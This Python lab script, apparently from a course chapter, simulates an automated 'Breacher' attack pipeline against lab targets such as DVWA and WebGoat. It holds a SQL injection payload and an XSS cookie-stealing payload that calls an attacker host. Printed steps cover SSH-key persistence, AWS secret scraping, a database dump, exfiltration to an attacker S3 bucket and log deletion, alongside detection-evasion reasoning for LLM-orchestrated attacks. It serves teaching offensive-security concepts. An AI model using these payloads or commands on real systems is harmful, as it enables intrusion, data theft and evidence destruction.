import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import json, time
from shared.config import config
from shared.mock_tools import mock_exploit

DIVIDER = "=" * 60

def node_webhook_trigger(pkg):
    print(f"\n  [n8n] Webhook trigger received")
    print(f"        Entry point : {pkg['entry_point']}")
    print(f"        Technique   : {pkg['technique']}")
    print(f"        Confidence  : {pkg['scout_confidence']}")
    time.sleep(0.3)
    return {"status": "triggered", "target_package": pkg}

def node_payload_generator(ctx):
    technique = ctx["target_package"].get("technique", "sql_injection")
    library = {
        "sql_injection": {"payload": "' UNION SELECT username, password FROM users--",
                          "source": "precompiled_sqli_v3.py"},
        "xss": {"payload": "<script>fetch('http://attacker/'+document.cookie)</script>",
                "source": "precompiled_xss_v2.py"},
    }
    selected = library.get(technique, library["sql_injection"])
    print(f"\n  [n8n] Payload generator: selected {selected['source']}")
    print(f"        Payload: {selected['payload'][:60]}...")
    time.sleep(0.2)
    return {**ctx, "selected_payload": selected}

def node_http_request(ctx):
    target = ctx["target_package"]["entry_point"]
    vuln_type = ctx["target_package"]["technique"]
    payload = ctx["selected_payload"]["payload"]
    print(f"\n  [n8n] HTTP request node: firing payload at {target}")
    # Call real_sqli_check with the correct endpoint
    from shared.mock_tools import real_sqli_check
    sqli_url = target.rstrip("/") + "/search?q="
    result_raw = json.loads(real_sqli_check.invoke({"url": sqli_url}))
    result = {
        "target": target,
        "vuln_type": vuln_type,
        "payload": payload,
        "success": result_raw.get("vulnerable", False),
        "output": result_raw.get("evidence", ["No evidence"])[0] if result_raw.get("evidence") else "No output",
        "note": "REAL HTTP request to lab target"
    }
    print(f"        Success: {result['success']}")
    if result["success"]:
        print(f"        Output: {result['output'][:80]}...")
    time.sleep(0.3)
    return {**ctx, "exploit_result": result}

def node_response_validation(ctx):
    success = ctx["exploit_result"].get("success", False)
    print(f"\n  [n8n] Validation node: exploit {'CONFIRMED' if success else 'FAILED'}")
    return {**ctx, "validated": success}

def node_persistence(ctx):
    if not ctx.get("validated"):
        print(f"\n  [n8n] Persistence: SKIPPED (exploitation failed)")
        return {**ctx, "persistence": False}
    print(f"\n  [n8n] Persistence node: [SIMULATED ONLY]")
    print(f"        Would run: echo 'attacker_pub_key' >> ~/.ssh/authorized_keys")
    print(f"        No real changes made.")
    return {**ctx, "persistence": True}

def node_post_exploitation(ctx):
    if not ctx.get("validated"):
        return ctx
    print(f"\n  [n8n] Post-exploitation pipeline: [ALL SIMULATED]")
    for name, cmd in [
        ("Credential scrape", "grep -r 'AWS_SECRET' /app/config/"),
        ("Database dump",     "pg_dump customers > /tmp/dump.sql"),
        ("Exfiltration",      "aws s3 cp /tmp/dump.sql s3://attacker-bucket/"),
        ("Log cleanup",       "find /var/log -newer /tmp/marker -delete"),
    ]:
        print(f"        [{name}] {cmd}")
        time.sleep(0.1)
    return {**ctx, "post_exploitation": "complete"}

def explain_split_architecture():
    print(f"\n{DIVIDER}")
    print("Why Scout + Breacher split is effective (Chapter 8, pp. 6-7)")
    print(DIVIDER)
    for title, detail in [
        ("Stealth through asymmetry", "Scout is slow+quiet. Breacher is fast+noisy but lasts only seconds."),
        ("Reliability via determinism", "LLM never improvises exploits. n8n runs pretested hardcoded payloads."),
        ("Horizontal scalability", "One Scout feeds multiple Breacher workers in parallel."),
        ("Detection evasion", "Burst-style exploitation shrinks the detection window."),
    ]:
        print(f"\n  [{title}]\n  {detail}")

if __name__ == "__main__":
    print(DIVIDER)
    print("Lab 1b: Cobalt Flow Breacher (n8n Pipeline Simulation)")
    print("Chapter 8, pp. 4-7 — all nodes simulated, no real exploitation")
    print(DIVIDER)

    # Read inputs from GUI environment variables
    ALLOWED_TARGETS = {
        "Flask Lab Target": config.LAB_TARGET_URL,
        "WebGoat":          config.WEBGOAT_URL,
        "DVWA":             config.DVWA_URL,
    }
    GUI_TARGET  = os.environ.get("GUI_BREACHER_TARGET", "Flask Lab Target").strip()
    GUI_TECHNIQUE = os.environ.get("GUI_BREACHER_TECHNIQUE", "sql_injection").strip()

    entry_url = ALLOWED_TARGETS.get(GUI_TARGET, config.LAB_TARGET_URL)
    print(f"Breacher target   : {entry_url}")
    print(f"Breacher technique: {GUI_TECHNIQUE}")

    pkg = {
        "entry_point": entry_url,
        "technique": GUI_TECHNIQUE,
        "services": [{"port": 8080, "service": "http", "product": "Werkzeug", "version": "2.3.0"}],
        "subdomains": [{"subdomain": "dev-api.localhost", "status": 200}],
        "scout_confidence": "HIGH",
    }
    print(f"\n{DIVIDER}")
    print("BREACHER: n8n exploitation pipeline")
    print(DIVIDER)
    ctx = node_webhook_trigger(pkg)
    ctx = node_payload_generator(ctx)
    ctx = node_http_request(ctx)
    ctx = node_response_validation(ctx)
    ctx = node_persistence(ctx)
    ctx = node_post_exploitation(ctx)
    explain_split_architecture()
    print(f"\n{DIVIDER}")
    print("Lab 1 complete. Next: python 02_langgraph_agent/run_agent.py")
    print(DIVIDER)
